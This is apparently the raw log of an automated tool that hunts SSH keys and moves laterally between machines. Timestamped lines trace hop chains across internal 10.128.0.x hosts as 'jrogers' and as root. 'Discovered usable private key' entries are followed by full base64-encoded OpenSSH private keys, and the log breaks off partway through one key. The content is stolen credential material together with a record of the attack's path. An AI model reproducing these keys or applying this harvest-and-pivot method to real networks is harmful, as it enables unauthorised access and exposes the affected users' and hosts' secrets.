LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF4dllUdE81WGEvUDN4S0ZPRTFTY3JhbmhFZHhZTzFIbUE1bnNpNVdIbHBOSURhWU5WZDIvCndOWEw1QXB4Sm5sYjFBUitObUtGa1RPN3ZyUmZaVkZ0UW1TejVEMkl0K3dUanc0SUpQdjBVdEVzUHd6VzNSTlhZRGFrZkgKRDd1T1RXZGt2VlMyVEtnL2w1TCttRDZjMjkxaUNQaVZPUVV0UENjWEJPQ1dBNURKelpIWEh5VVpvcUsvSlkvSS9KR0lINgpDMUhrQzVxaTFISERiVXlYbjd5dzMxU3QvL0Mra3VVdHYxM0lHTU5WUlNST09HYXp2VnZlTFlnK0k2c0d2dlFWRjNUKzBTCnJYaC9JZWg1Vkw0eVNvWUhOVTYvbHBNbFZiV1VoaXhLUURJaTFTdkNwMUlJNXJEd01ickszeWxyb3U3bEV5a2IrUjR0alIKcjVHd1NIMkJ1TVNtMzlEM1U5WVhTVEtNZW1tOERsQjhsazkxL0lXWXBwckxvMjlINkM2N3NweEFuRHRwbHZtWFh0YUU4dwpYSFpKaVBwTlRuL2JWQ25USXlmY3hLK0hwQURZQStQRUxZNzB1RE1aSWtLSmVPaGY0SzhPNkRSaGxvTmFCQmVId1JORzJ4Cmw4QkY2WWppNU5WUUpjS0dMZlpOYjVDUEpDZkVnS0hQd01Bb0ZNNmpBQUFGaUxyK2N0YTYvbkxXQUFBQUIzTnphQzF5YzIKRUFBQUdCQU1iMkU3VHVWMnZ6OThTaFRoTlVuSzJwNFJIY1dEdFI1Z09aN0l1Vmg1YVRTQTJtRFZYZHY4RFZ5K1FLY1NaNQpXOVFFZmpaaWhaRXp1NzYwWDJWUmJVSmtzK1E5aUxmc0U0OE9DQ1Q3OUZMUkxEOE0xdDBUVjJBMnBIeHcrN2prMW5aTDFVCnRreW9QNWVTL3BnK25OdmRZZ2o0bFRrRkxUd25Gd1RnbGdPUXljMlIxeDhsR2FLaXZ5V1B5UHlSaUIrZ3RSNUF1YW90UngKdzIxTWw1KzhzTjlVcmYvd3ZwTGxMYjlkeUJqRFZVVWtUamhtczcxYjNpMklQaU9yQnI3MEZSZDAvdEVxMTRmeUhvZVZTKwpNa3FHQnpWT3Y1YVRKVlcxbElZc1NrQXlJdFVyd3FkU0NPYXc4REc2eXQ4cGE2THU1Uk1wRy9rZUxZMGErUnNFaDlnYmpFCnB0L1E5MVBXRjBreWpIcHB2QTVRZkpaUGRmeUZtS2FheTZOdlIrZ3V1N0tjUUp3N2FaYjVsMTdXaFBNRngyU1lqNlRVNS8KMjFRcDB5TW4zTVN2aDZRQTJBUGp4QzJPOUxnekdTSkNpWGpvWCtDdkR1ZzBZWmFEV2dRWGg4RVRSdHNaZkFSZW1JNHVUVgpVQ1hDaGkzMlRXK1FqeVFueElDaHo4REFLQlRPb3dBQUFBTUJBQUVBQUFHQkFKbEdTYmhCUlNmdE14dFFDUTNyU1NpZ2pyCnRydkswMlVyVERoKytncW12ZDJzeG8rQzBHUUFzV3FaUnNWdThFM3pGZXBMelErWVQ3RGMvRXRSa2d1Y05FUVRHOEZlOWEKOTFabHdQQjlDYVFqY0tyQ0FXVWUyVmxOdnpuKzhHMW9IYS9VaStVaEtNS3pGaUZMREV5NksxMGlpSEdLNXN4b1JvdU5zUgpDWUNGc25HandNNUZqcEkwUG4xNVg2VHptS0tFOUFMeWFoWW4rM2hJNVhTeGZNRFpaL2JleVdVcnBudys2QkdQMjZ2WjRlCmNnUVJXcmF1WjJNOGFtS2dCdnBrbmQ0ZWZTc1lGLzRlZjlmU1dpVFl2eFNWSVROWEN0ZWUxc0JHZGpNMXEraGRCZ21QZHcKY2R5VlJUbExEL212a1RMYm5FRmEvVnJ2Z3lUQTZqUTlzSjJaSHM4Rjg1Y3o0c2pIZTExbzNwVm5MUXRqU3ZueWZNbzc2ZApFMmc2ZHdXRkVPRW1oRi8yOWFhdWl2MWdGZEU0S1lkVm1keTMvd2I5aWdFSmZyVENKZjdHMHNJYUx6SlM0TDZGQTRSNmdrCm1JOFBlWWhDUkZaN0ZxWUl1ODUzTEhyQ256TkhrdG5MeHJUY2RZKy9MenF1endYR3VQU0RKRy9lWHBlSCtlSjVjM2dRQUEKQU1FQTBJTnFFZEhBWGNxNGhEa25mSGVPcVFYb1ZrMmFsS1VJcHRHVlplNnphSW92dHBDU1IzZUltVy9Icm9YZDFJQVZ5Vgpqck52NzlIdWl0R013NmNxODJVY1M5NmRUU3hEVFQ1QXc2TXVvVzVaQUswLzFWenM2TlFJZ0dselZPNU9ib0RXZEVhV1FrCitTdXEvOHZpMEQzakV0RGF1Q1ZjUUh5dTVaTGtMRTQxTk5oY05PN0hndjc3a2Z3TnZpdkN3ZHpMNGFLeldCMDBNVWp0N28KUjY0UnFvVFhWUmxXUHFUOWFVZ2lwNzVmWXNMSVFFVmtFc1kySjUydkdwejd1ZmFMakRBQUFBd1FEMU9Cemt2NGhEQmdscwpXeHVwQWk5NTMxOU14bXgzWk9tbm1aMWxrKzFQNlIyU0orUEt0QlBXL0FNTjFTWk5XVjlaNWQxcXVHMXVYc3U4N0RvenB3CkZzU2hvdXY5eXo1VXkwWlJkUVRZYTlXYXRkT3lld0s1L3RuSzhKTDVjNklEUVA0SDQzR1U1cmxFMzlnYmwxK2U3LzBtT3MKWVJ6djcvZVhhakJUcS92MFVtRDZCczUvckRtK3cwUGpVWkJHTG1DRVBSVUFYTTdSUld2Rm53MWxzRjNnMDJoaXJQVlgxbApudkxKcVMxQW1xaFRyRHNNbmY3Snlqa0k0MzI0Y2xJV3NBQUFEQkFNKzFWMWs1MktzN2hHdzVBSWNjVThIdFg3d3poaFpICjh2bnhCUmJNYmNZMjFHS21jWlN6N0pzUGNuekFVVlZhbkZKK1VjUUl6OFNWbGRMdHU5dzQySUdxY2JJSDl1NG1NMnI0STkKQ0JNTlZKMk1mMUF1N2ZYbkRka2E4bWJDclBxZUY5T05tVGFlcVg4VllVVW9VTU1rbEdyRGp3bHdQajlGZ21NeGY5WG5kcQpHdEtCbFZFVlAxUmNsd25LUWlyMnNmV0pWQkNRL3NhWVJBcnVrWDUvY2dLWmNTNXBrSWRGc0wxU1gwWXZyd00rRTdUSGlPClkxSnI1U3NhWDcvMkg5cVFBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRZQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020327]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020328]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020328]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020328]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020328]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020328]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020328]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020329]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: Discovered usable private key [3072 MD5:ce:66:2c:1c:cb:51:ae:5d:b6:57:78:52:fa:ad:85:8e jrogers@instance-4 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020329]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFxR1UzdVhNWXRoVXV0QzJLbkRqOXR2MjEzcWxPR053d0ltY2gxajlqSjloMi95dlRFV0ZZCk1SMmIvTTdWQzJONlgzZDB5OGx0R1hKQXJsdlRINEswcmJMdGNMNVdCSy9KSS8yc1U0NjlSai9GOE40M1grS2UrQWlvOTkKNHdMVjJKUlg0c3daRDRsSFNBQ3JlT3E2WlF5R0dyU3o5MnRuNy9YQUpPSVVMOGJpTUsrMWZ4aFh6MmxZYXkxTWhYaFZONQpoeDlBRTl0V1pwd1VzYzJ2Kys5blRqSW5OeU95U0N6Ym55QWFKSy9seDVtaWhKUERsQkE1NTFDUzdQNE1TeU5xc1FtQzBwCnpJTjJNcW04RG1iUnJydVpBWWNFRytKNXVINWZtR2szY0dPZ3JlSlp0VXJIR0NGQjNkUmN1RGNqemVjWmNmUzFpOERrV0QKWlJGeXQrTjlwZU5vSXM2Nk9JL0VnTENWMkczcVB3SUJIcys4RVVFNmZUUmYvRXc0eHBLVm9QZDAvcjhEUy9Sak51UE1IVwpvSU53TjFtYnpHci8wbXFNemFjektHTFZldENFLzZ6MXZJb3pNM1VRRGU0NFVQNmo4aTdFaHFXM0xiUmdYQ01iQ2lpdXdrCjBXYkdtS2o5Q0RnZm51NUl5UUp3d0dwUUxMY0Nqd1ZCQ2d1dDNXaHBBQUFGaUxoU1JlMjRVa1h0QUFBQUIzTnphQzF5YzIKRUFBQUdCQUtobE43bHpHTFlWTHJRdGlwdzQvYmI5dGQ2cFRoamNNQ0puSWRZL1l5ZllkdjhyMHhGaFdERWRtL3pPMVF0agplbDkzZE12SmJSbHlRSzViMHgrQ3RLMnk3WEMrVmdTdnlTUDlyRk9PdlVZL3hmRGVOMS9pbnZnSXFQZmVNQzFkaVVWK0xNCkdRK0pSMGdBcTNqcXVtVU1oaHEwcy9kclorLzF3Q1RpRkMvRzRqQ3Z0WDhZVjg5cFdHc3RUSVY0VlRlWWNmUUJQYlZtYWMKRkxITnIvdnZaMDR5SnpjanNrZ3MyNThnR2lTdjVjZVpvb1NUdzVRUU9lZFFrdXorREVzamFyRUpndEtjeURkaktwdkE1bQowYTY3bVFHSEJCdmllYmgrWDVocE4zQmpvSzNpV2JWS3h4Z2hRZDNVWExnM0k4M25HWEgwdFl2QTVGZzJVUmNyZmpmYVhqCmFDTE91amlQeElDd2xkaHQ2ajhDQVI3UHZCRkJPbjAwWC94TU9NYVNsYUQzZFA2L0EwdjBZemJqekIxcUNEY0RkWm04eHEKLzlKcWpNMm5NeWhpMVhyUWhQK3M5YnlLTXpOMUVBM3VPRkQrby9JdXhJYWx0eTIwWUZ3akd3b29yc0pORm14cGlvL1FnNApINTd1U01rQ2NNQnFVQ3kzQW84RlFRb0xyZDFvYVFBQUFBTUJBQUVBQUFHQUNjZUhDdkFTT1ZEVm00VWhqWjBKcnZ6ZytRCk5nRTdXRjNobWJMM1FTOEJkMEliR0wybkNLeko5cGxhNzFWR244aTFyR242Y2MvT05UdWt4KzRFK1k2cFYva0pLZE1EeDkKTStmaGdDREVBVFptNm13ZFR5WThFUzkva0pXSXVybTU1UjFFd0NFSkxxWHRZYkh6U1NpcGZGbWZ0d2tDZmVxMkxjTzhnZApZQUR1MWVEK2Exa2drRjBQMDNtWC9oQlU4cHVaMG8vWDQ1Y0ZBVUs1ZEVaeDhxSXJKcThKclVHYmp4TURhUERoNWcrOHlDClVheTdLUGdnUkx5N0s2UTlWb2ZCN0UvM3dMR2RWbDJlQ2hnWDR2MlFzUU5qazNZdldZKzdORW5kT3VvU1JZd3luOFBLdzEKcUdPTmJMcTJyU1NsOG16b0xYeTVMcmovV25zTHU2YWZtcTYvOUpOaDBWamNDRkZCNEUzTUI2U1lkNUpSeUxxUEZaRHBPRgpsbG81bEovN0c2Sk9OaWFyanhaZTdobitpLzMvWTkwVVEyN3lpaUUxUlowV3A0L0lRSkZoSGRJejVNSVBFWnRobjk2ZzlyCjB3OFVKMTE5QldDcmlHWTlldG84K1VoRjZmNVlocys0N255a2ZwblFHQ2NWRXBRV1kvbEJobkxtMXE1ZGpJWXZMNUFBQUEKd0Z0TGdFc3lSVEFCa2QxZVA2cXMycG5oM2NWY2RUcTdSSWRwcFNGTmtMQUc1dE1sam9UajVNL1QxSjJMbFVJcXIzRFFJbQpxSFQ4KzVIN3V3N1BudEg2OHE1UXo2NmRqajF3ZVhjMVJ1MHhtc3JKc2M4NFJ0ZG9tSGtuUnp3MUpubis2eUtLbUdvVUhpCjJ0N0JOZHBBdC9HZElNMitES0RCVjVqbUREaUdHblJvdUVvSjBKb0VZeGtpTFFwL0xWNzhtMHU4MktwN212cW1rNmY4MDYKcEl1ME10cnpUME55ZFZ6QzQvRjZ0RkZ3WVIycmtucGRpMWU5d0NxUUpPZFQ2UDBnQUFBTUVBMTYvTUtiVlAxbnhlRC8yUQpxTGlkdjFqc2QrWVNPNThQQXRNM0c2QVJ3TEFrNktpSktFUHpWUUJtRDZzNVZsRi9mM2kwQWh1c2pMQnJGZjhDbTRtUmhRClpvM3dIN2Jabkl0dG1sT21VNERRVWhIZUU3RzdSQ2JIRUx3U2tybE5ocTdwYldyUk9nOUxmYVBPZkNNaEN1NzBmWTcwSWIKa3JPRytpay83b1ByQkc1dk0rNmw5SkorNWpLMlM5Sm9hb25GdGFJY1FYeXBuOUpFbTZramVZcjJVZzdnNkV3WjMrSzM0RQpOdHN5OUczNDVsdXJQNjBZTldOK2VrZkhWQnlNdURBQUFBd1FESDNwNkpFSCtDZCt4eW1SaDhVTlo3RmFLeXNNVmRMdDRNCllIVVZKVTJPQ2lIRUhoT0xXdzR2R3dLUWZsZDdNME1mTlVTRDE5SmZkMEVMTFNHUmhEeTdKaGpkYUNTMHdtZWlXYUc3OFYKcDhJSHFJYXlmd1BJWCtiY0t2SEErTysyM1pzckJRaUxKRHZES1VmYTA3bjV5dnNFMnFaZEdtaFAxQmcvanBKSFpHek9ESwozL0FxYlkzVWczS3RMM3VnaFhmSGEzSm5Iam5lUytYZ0tyOEtJQUFyTTFmUFFQcS9QVHZMU2Rzb2VjTzB2eEcxK1Aza2F3CkxyRFdFa2k2VUFuS01BQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMEFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020329]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020330]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020330]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020331]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020331]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020331]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020331]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020331]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020331]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020331]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020331]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020332]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: Discovered usable private key [3072 MD5:b6:30:3a:99:e8:36:fe:81:33:0c:b2:82:6a:44:9a:55 jrogers@instance-6 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020332]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF3OU5sODBtQ04za1VuNVBRazhoY3hFY0xVQjJ1R0IvZVVHSTNxVnlPeEVwN3VKNC9uTlVxCjRmYmlDQlQ2SlExUFExRUtCM1JHNEtqSHpobnJreDcxR1J4YW45ZHBVN3QwRkZxbVVnajE1dVBqVy9Yd1hmMlJkUHFETVgKQm1STUdid3lnRUpibUpvblN2aGFBUjk5TTRONkZnTGJGb2hJYkJZcERRZkRublhpUDFxcHpVa1crMklaVTFaNFN4YWplNApXak1FREtCL0Z0b3gxbVVNQXlHUUx6WVovL1BORWtnY21ZakZYL0JVZUZqSkhHYzRTb0lsbThBVFpYcHYzZEVqNEt0VktGCkFEdHUySUlSbFlmcEJJeElmVjFybnJQSUtUdG1yME52NHlkSWhpTWFuVzNsalZ3c05oOFlwUGRGd1krWEN5QVdLd2ovaGkKbDVRTzlQQm93SmE1a0ttV0x5V2FYanc3Z3FacXVKbVNhWWVnYldsV0w3ejdrQ0ZNbUdkZlpwWkgrVXlXejhhZldjZlhkRQo3V1RPSUc3Qm9iTnZGczhPNVBmMllIRkhrZXhhNkVqS2pSOE9Jc0xJZGU0WnJmSVZGOVdYekdhUi9Xd0FFams3VWdhSGVuCmRmMllkWGFOWEQzT1hvL3AyQjk5M2Z1dFY1V0IzVkZuQWhLaGo0Zi9BQUFGaUJSbUJIa1VaZ1I1QUFBQUIzTnphQzF5YzIKRUFBQUdCQU1QVFpmTkpnamQ1RkorVDBKUElYTVJIQzFBZHJoZ2YzbEJpTjZsY2pzUktlN2llUDV6Vkt1SDI0Z2dVK2lVTgpUME5SQ2dkMFJ1Q294ODRaNjVNZTlSa2NXcC9YYVZPN2RCUmFwbElJOWViajQxdjE4RjM5a1hUNmd6Rndaa1RCbThNb0JDClc1aWFKMHI0V2dFZmZUT0RlaFlDMnhhSVNHd1dLUTBIdzU1MTRqOWFxYzFKRnZ0aUdWTldlRXNXbzN1Rm96QkF5Z2Z4YmEKTWRabERBTWhrQzgyR2YvenpSSklISm1JeFYvd1ZIaFl5UnhuT0VxQ0padkFFMlY2YjkzUkkrQ3JWU2hRQTdidGlDRVpXSAo2UVNNU0gxZGE1Nnp5Q2s3WnE5RGIrTW5TSVlqR3AxdDVZMWNMRFlmR0tUM1JjR1Bsd3NnRmlzSS80WXBlVUR2VHdhTUNXCnVaQ3BsaThsbWw0OE80S21hcmlaa21tSG9HMXBWaSs4KzVBaFRKaG5YMmFXUi9sTWxzL0duMW5IMTNSTzFremlCdXdhR3oKYnhiUER1VDM5bUJ4UjVIc1d1aEl5bzBmRGlMQ3lIWHVHYTN5RlJmVmw4eG1rZjFzQUJJNU8xSUdoM3AzWDltSFYyalZ3OQp6bDZQNmRnZmZkMzdyVmVWZ2QxUlp3SVNvWStIL3dBQUFBTUJBQUVBQUFHQUJyTDZyK0g1NUcvdDlxK1YyUmhucEFkU0tjCkY2TFRVWjQrSVlTV0R